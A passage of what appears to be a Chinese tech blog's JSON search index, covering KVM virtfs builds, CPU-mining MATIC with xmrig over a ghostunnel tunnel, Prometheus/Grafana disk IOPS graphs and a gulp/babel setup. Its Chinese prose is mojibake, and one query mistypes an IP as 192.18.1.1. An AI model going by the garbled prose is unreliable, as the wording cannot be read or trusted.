åŒ…ï¼Œä¹Ÿä¸æ±¡æŸ“ç¯å¢ƒã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå…‹éš†ä¸‹æ¥é¡¹ç›®ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003egit clone https://github.com/AlekseyChudov/qemu-kvm-virtfs.git\n\ncd qemu-kvm-virtfs\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eçœ‹ä¸€ä¸‹æœ€åçš„ build è„šæœ¬ï¼Œæœ‰ä¸€ä¸ªåœ°æ–¹éœ€è¦ä¿®æ”¹ï¼š\u003c/p\u003e\n\u003cp\u003eç°åœ¨çš„ CentOS æœ€æ–°ç‰ˆæ˜¯ 7.9.2009 ï¼Œè¿™ä¸ªç‰ˆæœ¬æ ‘é‡Œæ˜¯æ²¡æœ‰ qemu çš„ Source Code çš„ï¼Œéœ€è¦ä¿®æ”¹ baseurlï¼Œé™ä½åˆ° 7.8.2003 æ‰æœ‰ Source çš„ repo\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebaseurl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003ehttps://mirrors.tripadvisor.com/centos-vault/centos/\\$releasever/virt/Source/kvm-common/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eæ”¹æˆï¼š\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebaseurl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003ehttps://mirrors.tripadvisor.com/centos-vault/centos/7.8.2003/virt/Source/kvm-common/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ”¹å¥½å build è„šæœ¬å¦‚ä¸‹\u003c/p\u003e","title":"KVMä¸‹å®¿ä¸»æœºçš„ç›®å½•ç›´é€šåˆ°è™šæœº"},{"content":"è¿™æ˜¯ä¸ªä¸¥è‚ƒè¯é¢˜ï¼Œæ­£ç»æŒ–ä»¥å¤ªå¸çš„è¯ï¼Œå¾ˆå¤šçš„çŸ¿å‚éƒ½æ˜¯å¦‚æœç›´æ¥æŒ–åˆ°ä»¥å¤ªå¸åœ°å€ï¼Œé‚£ä¹ˆå¿…é¡»æŒ–åˆ°å®Œæ•´ä¸€ä¸ªæ‰å…è®¸æç°ï¼Œæ‰‹ç»­è´¹è¿˜ç‰¹é«˜ã€‚\nä½†æ˜¯å¦‚æœæŒ–åˆ°ä»¥å¤ªé“¾Polygonçš„åœ°å€çš„è¯ï¼Œå°±å¯ä»¥ 0.005 ETHæå¸äº†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º\nä½†æ˜¯åƒä¸‡è®°ä½ï¼ŒPolygonæå‡ºçš„æ‰€è°“ 0.005 ETHï¼Œçœ‹ä¸‹å›¾ï¼Œåªæ˜¯ä¸ªERC-20çš„Tokenï¼Œå®é™…æ˜¯wETH Tokenï¼Œå¿…é¡»ç»è¿‡è½¬æ¢æ‰èƒ½æåˆ° ETH å»ã€‚\nä» ERC-20 è½¬æ¢åˆ°å…¶å®ƒä»£å¸å‘¢ï¼Œéœ€è¦ MATIC ä»£å¸æ¥ä»˜è´¦ï¼Œè¿™ç©æ„ä¹Ÿå¿…é¡»å¾—æœ‰å•Šï¼åºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥æ”¾ä¸ŠæŒ–MATICæ•™ç¨‹ï¼Œæˆ‘çš„æœºå™¨æ˜¯ CentoOS\né¦–å…ˆéœ€è¦æœ‰ä¸ªå®Œå…¨è‡ªä¸»çš„çš„ ETH é’±åŒ…åœ°å€ï¼Œè¿™ä¸ªæˆ‘å°±ä¸æ•™å¤§å®¶äº†\nä¸€ã€ä¸‹è½½xmrigæŒ–çŸ¿è½¯ä»¶ ä¸‹è½½åœ°å€ï¼šhttps://github.com/xmrig/xmrig/releases\næˆ‘ä»¬é€‰æ‹©æœ€è¿‘çš„ä¸‹è½½å°±å¥½\näºŒã€åšå¥½åŠ å¯†é€šé“ æˆ‘ä»¬éœ€è¦åšå¥½ä¸€æ¡åŠ å¯†tcpé€šé“\nç”¨ ghostunnel, localhost:9012 \u0026mdash;\u0026gt; vps:9012 \u0026mdash;\u0026gt; rx.unmineable.com:3333\nä¸‰ã€ç”¨screenåå°å¼€æŒ– screen #./xmrig -o localhost:9999 -a rx -k -u DOGE:MATICåœ°å€.çŸ¿å·¥å ./xmrig -o localhost:9012 -u MATIC:0x64358C7ddC96001697aBbA7ed431BADB6ABAaec5.cpu01 -p x --cpu-no-yield ctrl+a+d å››ã€æŸ¥çœ‹æŒ–äº†å¤šå°‘ æŸ¥çœ‹åœ°å€ï¼šhttps://unmineable.com/coins/MATIC/address/\näº”ã€å…‘æ¢ æŒ–åˆ°äº†è¶³å¤Ÿçš„ MATICï¼Œå°±å¯ä»¥æ„‰å¿«çš„å…‘æ¢äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20220222-eth_matic/","summary":"\u003cp\u003eè¿™æ˜¯ä¸ªä¸¥è‚ƒè¯é¢˜ï¼Œæ­£ç»æŒ–ä»¥å¤ªå¸çš„è¯ï¼Œå¾ˆå¤šçš„çŸ¿å‚éƒ½æ˜¯å¦‚æœç›´æ¥æŒ–åˆ°ä»¥å¤ªå¸åœ°å€ï¼Œé‚£ä¹ˆå¿…é¡»æŒ–åˆ°å®Œæ•´ä¸€ä¸ªæ‰å…è®¸æç°ï¼Œæ‰‹ç»­è´¹è¿˜ç‰¹é«˜ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯å¦‚æœæŒ–åˆ°ä»¥å¤ªé“¾Polygonçš„åœ°å€çš„è¯ï¼Œå°±å¯ä»¥ 0.005 ETHæå¸äº†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220222154256454\" loading=\"lazy\" src=\"/posts/20220222-eth_matic/image-20220222154256454.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯åƒä¸‡è®°ä½ï¼ŒPolygonæå‡ºçš„æ‰€è°“ 0.005 ETHï¼Œçœ‹ä¸‹å›¾ï¼Œåªæ˜¯ä¸ªERC-20çš„Tokenï¼Œå®é™…æ˜¯wETH Tokenï¼Œå¿…é¡»ç»è¿‡è½¬æ¢æ‰èƒ½æåˆ° ETH å»ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220222154450998\" loading=\"lazy\" src=\"/posts/20220222-eth_matic/image-20220222154450998.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä» ERC-20 è½¬æ¢åˆ°å…¶å®ƒä»£å¸å‘¢ï¼Œéœ€è¦ MATIC ä»£å¸æ¥ä»˜è´¦ï¼Œè¿™ç©æ„ä¹Ÿå¿…é¡»å¾—æœ‰å•Šï¼åºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥æ”¾ä¸ŠæŒ–MATICæ•™ç¨‹ï¼Œæˆ‘çš„æœºå™¨æ˜¯ CentoOS\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆéœ€è¦æœ‰ä¸ªå®Œå…¨è‡ªä¸»çš„çš„ ETH é’±åŒ…åœ°å€ï¼Œè¿™ä¸ªæˆ‘å°±ä¸æ•™å¤§å®¶äº†\u003c/p\u003e\n\u003ch2 id=\"ä¸€ä¸‹è½½xmrigæŒ–çŸ¿è½¯ä»¶\"\u003eä¸€ã€ä¸‹è½½xmrigæŒ–çŸ¿è½¯ä»¶\u003c/h2\u003e\n\u003cp\u003eä¸‹è½½åœ°å€ï¼šhttps://github.com/xmrig/xmrig/releases\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬é€‰æ‹©æœ€è¿‘çš„ä¸‹è½½å°±å¥½\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20220222-eth_matic/image-20211021101957637.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"äºŒåšå¥½åŠ å¯†é€šé“\"\u003eäºŒã€åšå¥½åŠ å¯†é€šé“\u003c/h2\u003e\n\u003cp\u003eæˆ‘ä»¬éœ€è¦åšå¥½ä¸€æ¡åŠ å¯†tcpé€šé“\u003c/p\u003e\n\u003cp\u003eç”¨ ghostunnel,    localhost:9012 \u0026mdash;\u0026gt; vps:9012 \u0026mdash;\u0026gt; rx.unmineable.com:3333\u003c/p\u003e\n\u003ch2 id=\"ä¸‰ç”¨screenåå°å¼€æŒ–\"\u003eä¸‰ã€ç”¨screenåå°å¼€æŒ–\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escreen\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#./xmrig -o localhost:9999 -a rx -k -u DOGE:MATICåœ°å€.çŸ¿å·¥å\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./xmrig -o localhost:9012 -u MATIC:0x64358C7ddC96001697aBbA7ed431BADB6ABAaec5.cpu01 -p x --cpu-no-yield\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ectrl+a+d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20211021102338089\" loading=\"lazy\" src=\"/posts/20220222-eth_matic/image-20211021102338089.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"å››æŸ¥çœ‹æŒ–äº†å¤šå°‘\"\u003eå››ã€æŸ¥çœ‹æŒ–äº†å¤šå°‘\u003c/h2\u003e\n\u003cp\u003eæŸ¥çœ‹åœ°å€ï¼š\u003ca href=\"https://unmineable.com/coins/MATIC/address/\"\u003ehttps://unmineable.com/coins/MATIC/address/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220222154854349\" loading=\"lazy\" src=\"/posts/20220222-eth_matic/image-20220222154854349.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"äº”å…‘æ¢\"\u003eäº”ã€å…‘æ¢\u003c/h2\u003e\n\u003cp\u003eæŒ–åˆ°äº†è¶³å¤Ÿçš„ MATICï¼Œå°±å¯ä»¥æ„‰å¿«çš„å…‘æ¢äº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220222155452048\" loading=\"lazy\" src=\"/posts/20220222-eth_matic/image-20220222155452048.png\"\u003e\u003c/p\u003e","title":"å¦‚ä½•ç”¨CPUæŒ–Polygonç½‘ç»œçš„MATICå¸"},{"content":"å…¬å¸è¦åšé˜¿é‡Œçš„å°ç¨‹åºæ¥å…¥ï¼Œéœ€è¦é€šè¿‡æµ‹è¯•ï¼Œæµ‹è¯•å‘¢éœ€è¦æä¾›ç¡¬ç›˜çš„ç›‘æ§æŠ¥å‘Šï¼Œæ¯”å¦‚ iops ã€‚\nåŒäº‹ä»ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹ï¼Œiops ç›‘æ§åŸæ–‡å¦‚ä¸‹ï¼šç›‘æ§ç£ç›˜çš„ iops ï¼Œåˆ©ç”¨ linux çš„ /proc/diskstats çš„ç¬¬å››ä¸ªå­—æ®µå’Œç¬¬å…«å­—æ®µå¯ç›‘æ§è¯»å’Œå†™çš„ iopsï¼Œç¬¬å››ä¸ªè®°å½•æ˜¯è®°å½•æ‰€æœ‰è¯»çš„æ¬¡æ•°ï¼Œç¬¬å…«ä¸ªå­—æ®µæ˜¯è®°å½•æ‰€æœ‰å†™çš„æ¬¡æ•°ã€‚é€šè¿‡ zabbix ä¸Šçš„å·®é€Ÿç‡å³å¯ç›‘æ§ç£ç›˜çš„ iopsã€‚\næ–‡ç« é“¾æ¥ï¼šhttps://cloud.tencent.com/developer/article/1519113?ivk_sa=1024320u\nä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹ä¸Šé¢çš„æ–‡ç« ï¼Œçœ‹äº†å®ƒæä¾›äº†ä¸¤å¼ ç›‘æ§å›¾ï¼Œåˆ†æä¸€ä¸‹ï¼š\nç¬¬ä¸€å¼ å›¾ï¼š\næœ‰ä¸¤ä¸ªæŒ‡æ ‡ï¼Œç»¿è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io è¯»æ¬¡æ•°ï¼Œçº¢è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io å†™æ¬¡æ•°ã€‚\nç¬¬äºŒå¼ å›¾ï¼š\nåŒæ ·ä¸¤ä¸ªæŒ‡æ ‡ï¼Œç»¿è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io è¯» Bytesï¼Œçº¢è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io å†™ Bytesã€‚\nçŸ¥é“äº†æŒ‡æ ‡å…·ä½“çš„å«ä¹‰ï¼Œè¿™æ ·å°±å¥½åŠäº†ã€‚\næˆ‘ä»¬ç”¨çš„æ˜¯ prometheus å’Œ node_exporter\né¦–å…ˆå»çœ‹çœ‹ node_exporter æš´éœ²çš„æŒ‡æ ‡ï¼Œæœä¸€æœ node_diskï¼Œä¼šçœ‹åˆ°å¦‚ä¸‹4ä¸ªæŒ‡æ ‡ï¼š\n# HELP node_disk_reads_completed_total The total number of reads completed successfully. # TYPE node_disk_reads_completed_total counter node_disk_reads_completed_total{device=\u0026#34;sda\u0026#34;} 4.9530358e+07 # HELP node_disk_writes_completed_total The total number of writes completed successfully. # TYPE node_disk_writes_completed_total counter node_disk_writes_completed_total{device=\u0026#34;sda\u0026#34;} 1.4449267304e+10 # HELP node_disk_read_bytes_total The total number of bytes read successfully. # TYPE node_disk_read_bytes_total counter node_disk_read_bytes_total{device=\u0026#34;sda\u0026#34;} 6.4101677568e+11 # HELP node_disk_written_bytes_total The total number of bytes written successfully. # TYPE node_disk_written_bytes_total counter node_disk_written_bytes_total{device=\u0026#34;sda\u0026#34;} 1.15483858333184e+14 å¯ä»¥çœ‹å‡ºæ˜¯ä¸Šé¢ 4 ä¸ªæŒ‡æ ‡ï¼Œè¿™å››ä¸ªæŒ‡æ ‡éƒ½æ˜¯ counter è®¡æ•°å™¨ç±»å‹çš„ï¼Œéƒ½æ˜¯åªå¢ä¸å‡çš„ã€‚\nç„¶åå» prometheus ï¼Œç”»ä¸ªå›¾è¯•è¯•ï¼Œquery åˆ†åˆ«å¦‚ä¸‹ï¼ˆæ³¨æ„æˆ‘ä»¬çš„ instance å³ node_exporterï¼Œæ˜¯è·‘åœ¨äº† 50000 ç«¯å£ï¼Œæ˜¯éæ ‡å‡†çš„ï¼‰ï¼š\nnode_disk_reads_completed_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;} node_disk_writes_completed_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;} node_disk_read_bytes_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;} node_disk_written_bytes_total{instance=\u0026#34;192.18.1.1:50000\u0026#34;} å¤§å®¶çœ‹åˆ°äº† counter ç±»å‹ï¼Œå¿…ç„¶æ˜¯ä¸€æ¡æ–œçº¿ç›´å†²å¤©é™…ã€‚\nå¥½äº†ï¼Œæˆ‘ä»¬ç„¶åå» grafana é‡Œå¢åŠ é¢æ¿ï¼š\né€‰ Add Query\nå…ˆé€‰æ•°æ®æºï¼Œé€‰æ‹©ç³»ç»Ÿä¸­å·²ç»é…å¥½çš„ prometheusï¼Œæ€ä¹ˆé…è¿™é‡Œå°±ä¸è¯´äº†ï¼š\nç„¶ååœ¨ Query çš„ Metrics é‡Œå¡«å…¥ node_disk_written_bytes_total{instance=\u0026quot;192.168.1.1:50000\u0026quot;}ï¼š\nåœ¨ Legend çš„ç©ºç™½å¤„éšä¾¿ç‚¹ä¸€ä¸‹ï¼Œå¤§æŠ˜çº¿å‡ºç°äº†ï¼Œè€Œä¸”ç»™å‡ºäº†æç¤ºï¼šTime series is monotonically increasing. Try applying a rate() function.\nå¬äººåŠï¼Œåƒé¥±é¥­ã€‚æˆ‘ä»¬æ”¹ä¸€ä¸‹ Metrics çš„æŸ¥è¯¢è¯­å¥ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯5åˆ†é’ŸæŠ“ä¸€æ¬¡æ•°æ®ï¼Œæ‰€ä»¥æ”¹æˆå¦‚ä¸‹æ ¼å¼ï¼š rate(node_disk_written_bytes_total{instance=\u0026quot;192.18.1.1:50000\u0026quot;}[5m])\nå†å¢åŠ ä¸€ä¸ªæŸ¥è¯¢ï¼ŒAdd Query åŒæ—¶æŠŠ read bytes å’Œ write bytes æ”¾è¿›ä¸€å¼ å›¾å»ï¼š\næœ€åä¿®æ­£ä¸€ä¸‹ï¼š\nA: Metrics: rate(node_disk_read_bytes_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;}[5m]) Legend: sda read per second B: Metrics: rate(node_disk_written_bytes_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;}[5m]) Legend: sda write per second å†æŠŠæœ€å¤§ã€æœ€å°ã€å¹³å‡ã€å½“å‰ç»™å‡ºæ¥ï¼š\nè¿™æ ·å›¾å°±åšå¥½äº†ï¼Œæœ€åå®Œå·¥çš„ä¸¤å¼ å›¾ï¼š\næ‰€æœ‰ prometheus ä»å„ç§ exporter æ”¶ä¸Šæ¥çš„æ•°æ®éƒ½å¯ä»¥è¿™ä¹ˆå›¾å½¢åŒ–ï¼Œä»¥åç”»å›¾å°±ä¸°ç®€ç”±äººäº†ã€‚\n","permalink":"https://rendoumi.com/posts/20220118-grafana_prometheus/","summary":"\u003cp\u003eå…¬å¸è¦åšé˜¿é‡Œçš„å°ç¨‹åºæ¥å…¥ï¼Œéœ€è¦é€šè¿‡æµ‹è¯•ï¼Œæµ‹è¯•å‘¢éœ€è¦æä¾›ç¡¬ç›˜çš„ç›‘æ§æŠ¥å‘Šï¼Œæ¯”å¦‚ iops ã€‚\u003c/p\u003e\n\u003cp\u003eåŒäº‹ä»ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹ï¼Œiops ç›‘æ§åŸæ–‡å¦‚ä¸‹ï¼šç›‘æ§ç£ç›˜çš„ iops ï¼Œåˆ©ç”¨ linux çš„ /proc/diskstats çš„ç¬¬å››ä¸ªå­—æ®µå’Œç¬¬å…«å­—æ®µå¯ç›‘æ§è¯»å’Œå†™çš„ iopsï¼Œç¬¬å››ä¸ªè®°å½•æ˜¯è®°å½•æ‰€æœ‰è¯»çš„æ¬¡æ•°ï¼Œç¬¬å…«ä¸ªå­—æ®µæ˜¯è®°å½•æ‰€æœ‰å†™çš„æ¬¡æ•°ã€‚é€šè¿‡ zabbix ä¸Šçš„å·®é€Ÿç‡å³å¯ç›‘æ§ç£ç›˜çš„ iopsã€‚\u003c/p\u003e\n\u003cp\u003eæ–‡ç« é“¾æ¥ï¼š\u003ca href=\"https://cloud.tencent.com/developer/article/1519113?ivk_sa=1024320u\"\u003ehttps://cloud.tencent.com/developer/article/1519113?ivk_sa=1024320u\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹ä¸Šé¢çš„æ–‡ç« ï¼Œçœ‹äº†å®ƒæä¾›äº†ä¸¤å¼ ç›‘æ§å›¾ï¼Œåˆ†æä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eç¬¬ä¸€å¼ å›¾ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220118093026319\" loading=\"lazy\" src=\"/posts/20220118-grafana_prometheus/image-20220118093026319.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæœ‰ä¸¤ä¸ªæŒ‡æ ‡ï¼Œç»¿è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io è¯»æ¬¡æ•°ï¼Œçº¢è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io å†™æ¬¡æ•°ã€‚\u003c/p\u003e\n\u003cp\u003eç¬¬äºŒå¼ å›¾ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220118093147796\" loading=\"lazy\" src=\"/posts/20220118-grafana_prometheus/image-20220118093147796.png\"\u003eåŒæ ·ä¸¤ä¸ªæŒ‡æ ‡ï¼Œç»¿è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io è¯» Bytesï¼Œçº¢è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io å†™ Bytesã€‚\u003c/p\u003e\n\u003cp\u003eçŸ¥é“äº†æŒ‡æ ‡å…·ä½“çš„å«ä¹‰ï¼Œè¿™æ ·å°±å¥½åŠäº†ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ç”¨çš„æ˜¯ prometheus å’Œ node_exporter\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå»çœ‹çœ‹ node_exporter æš´éœ²çš„æŒ‡æ ‡ï¼Œæœä¸€æœ node_diskï¼Œä¼šçœ‹åˆ°å¦‚ä¸‹4ä¸ªæŒ‡æ ‡ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# HELP node_disk_reads_completed_total The total number of reads completed successfully.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TYPE node_disk_reads_completed_total counter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enode_disk_reads_completed_total{device\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;sda\u0026#34;} 4.9530358e+07\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# HELP node_disk_writes_completed_total The total number of writes completed successfully.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TYPE node_disk_writes_completed_total counter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enode_disk_writes_completed_total{device\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;sda\u0026#34;} 1.4449267304e+10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# HELP node_disk_read_bytes_total The total number of bytes read successfully.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TYPE node_disk_read_bytes_total counter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enode_disk_read_bytes_total{device\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;sda\u0026#34;} 6.4101677568e+11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# HELP node_disk_written_bytes_total The total number of bytes written successfully.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TYPE node_disk_written_bytes_total counter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enode_disk_written_bytes_total{device\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;sda\u0026#34;} 1.15483858333184e+14\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¯ä»¥çœ‹å‡ºæ˜¯ä¸Šé¢ 4 ä¸ªæŒ‡æ ‡ï¼Œè¿™å››ä¸ªæŒ‡æ ‡éƒ½æ˜¯ counter è®¡æ•°å™¨ç±»å‹çš„ï¼Œéƒ½æ˜¯åªå¢ä¸å‡çš„ã€‚\u003c/p\u003e","title":"Grafanaç”»å‡ºprometheusçš„å›¾"},{"content":"æœ€è¿‘å¼€å§‹å¼„hubotï¼Œé¡ºå¸¦ä¹Ÿå¼€å§‹å­¦ä¹  javascript ï¼Œé¦–å…ˆä»å•ç‹¬ä¸€ä¸ª nodejs é¡¹ç›®å¼€å§‹ï¼š\nnvm å’Œ node çš„å®‰è£…ä½¿ç”¨åœ¨å‰é¢å·²ç»è¯´è¿‡äº†ï¼š Nodejså¤šç‰ˆæœ¬çš„å®‰è£…ä¸ç®¡ç†\næ–°å»ºä¸€ä¸ªé¡¹ç›®ç›®å½•ï¼Œbuild01\nç„¶ååœ¨å…¶ä¸‹å»ºç«‹å¦‚ä¸‹ç›®å½•ç»“æ„ï¼š\nmkdir build01 cd build01 mkdir es6 dist mkdir public cd public mkdir es6 dist è§£é‡Šä¸€ä¸‹ï¼Œes6 ä¸‹æ”¾çš„æ˜¯æœåŠ¡å™¨ç«¯çš„æºä»£ç ï¼Œdist ä¸‹æ”¾çš„æ˜¯æœåŠ¡å™¨ç«¯å¤„ç†è¿‡çš„æºä»£ç ã€‚\npublic/es6 æ”¾çš„æ˜¯æµè§ˆå™¨ç«¯çš„æºä»£ç ï¼Œpublic/dist æ”¾çš„æ˜¯æµè§ˆå™¨ç«¯å¤„ç†è¿‡çš„æºä»£ç ã€‚\nä¸€ã€å®‰è£…gulpå’Œbabel babel æ˜¯ç”¨æ¥åš js æ ¼å¼è½¬æ¢çš„ï¼Œæ³¨æ„ï¼ŒåŸæœ‰çš„ babel-preset-es2015 å·²ç»ä¸é€‚ç”¨äº†ã€‚\nnpm install --save-dev gulp gulp-babel babel-preset-env@next ç”Ÿæˆä¸€ä¸ª.babelrc æ–‡ä»¶ï¼Œå†…å®¹å°±ä¸€è¡Œ\n{ \u0026#34;presets\u0026#34;: [\u0026#34;env\u0026#34;] } åœ¨ es6 ç›®å½•ä¸‹ï¼Œå»ºç«‹ä¸€ä¸ªæµ‹è¯•çš„ test.js æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n\u0026#39;use strict\u0026#39;; const sentences = [ { subject: \u0026#39;JavaScript\u0026#39;, verb: \u0026#39;is\u0026#39;, object: \u0026#39;great\u0026#39; }, { subject: \u0026#39;Elephants\u0026#39;, verb: \u0026#39;are\u0026#39;, object: \u0026#39;large\u0026#39; }, ]; function say({ subject, verb, object }) { console.log(`${subject} ${verb} ${object}`); } for ( let s of sentences) { say(s); } ä»”ç»†çœ‹ï¼Œä¸Šé¢è¿™ä¸ªæ–‡ä»¶ç”¨åˆ°äº† es6 çš„è¯­æ³•ï¼Œå¯¹è±¡çš„è§£æ„ï¼Œofè¯­æ³•ã€‚\næˆ‘ä»¬æ¥ç”¨ babel æŠŠå®ƒè½¬æ¢ä¸€ä¸‹ï¼Œå˜æˆ es5 çš„è¯­æ³•\nåœ¨build01ç›®å½•ä¸‹ï¼Œç”Ÿæˆgulpfile.jsï¼Œå†…å®¹å¦‚ä¸‹ï¼š\nconst gulp = require(\u0026#39;gulp\u0026#39;); const babel = require(\u0026#39;gulp-babel\u0026#39;); gulp.task(\u0026#39;default\u0026#39;, done =\u0026gt;{ gulp.src(\u0026#34;es6/**/*.js\u0026#34;) .pipe(babel()) .pipe(gulp.dest(\u0026#34;dist\u0026#34;)); gulp.src(\u0026#34;public/es6/**/*.js\u0026#34;) .pipe(babel()) .pipe(gulp.dest(\u0026#34;public/dist\u0026#34;)); done(); }); 